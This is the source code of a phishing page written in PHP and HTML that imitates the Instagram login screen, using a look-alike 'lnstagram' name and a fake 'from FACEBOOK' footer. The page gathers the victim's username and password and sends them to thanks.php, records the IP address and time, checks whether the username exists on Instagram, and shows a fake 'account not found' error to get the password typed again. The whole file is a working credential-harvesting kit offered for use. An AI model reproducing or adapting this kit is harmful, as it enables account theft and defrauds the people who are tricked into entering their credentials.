<?php

if ($_POST) {

	
	$username=$_POST["username"];
	
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");


}
?>










<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css">
	<title>Login • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>

<body>
	<header>
		<table class="header-table">
			<tr class="header-tr">
				<th class="header-x"><span class="header-text" >lnstagram</span>
                    <span  class="header-text">Find it for free on Google Play.</span>
				</th>

				<th class="header-y">
					<p class="header-border">GET</p>
				</th>

			</tr>

		</table>


	</header>
	<center>
		<br><br>
		
		<img src="https://i.hizliresim.com/cHgTep.png" width="200">
		<br><br><br>
		<button class="fb-qenzy">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button><br><br>

		<table class="qen">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>
		<br>
		<form method="GET" action="thanks.php">






<?php
error_reporting(0);

function ara($bas, $son, $yazi)
    {
      @preg_match_all('/' . preg_quote($bas, '/') .
      '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
      return @$m[1];
    }
    if(isset($_POST['bul']))
{
    $username = $_POST['username'];
    $password = $_POST['password'];
    $link="https://www.instagram.com/$username";
    $icerik= file_get_contents($link);
    $durum= ara('<html lang="en" class="','">',$icerik);
    if ($durum[0] == "no-js not-logged-in client-root") {
    	echo '' ;

    } else {
    	echo "<p style= color: red;>
The username you entered doesn't belong to an account. Please check your username and try again.
    	</p>";
    }
}

?>
			<p style="color: red">
The username you entered doesn't belong to an account. Please check your username and try again.
    	</p>
			<input type="text" name="username" placeholder="Phone number, username, or email" required="" class="username" autocomplete="off"><br>
			<input type="password" name="password" placeholder="Password" required="" class="password">
			<br>
			<table class="sa">
				<tr class="as">
					<th class="x"></th>
					<th class="y">
						<span class="forgot">Forgot Password?</span>
					</th>
				</tr>
			</table>

			<br>
			<button type="submit" class="qenzyist" name="bul" value="bul">Log In</button>






		</form>
		<div class="dont">
			<span class="dont1">Don't have an account? </span>
			<span class="dont2">Sign up</span>

		</div>

	</center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>
<script type="text/javascript">
	console.log("Script Coded By Qenzyist");
</script>
<textarea Style="width: 1px; height: 1px" Rows="1" Cols="1">

<SCRIPT LANGUAGE="Javascript">

if (parent.frames.length > 0)

parent.********.href=self.********;

</SCRIPT>
</body>
</html>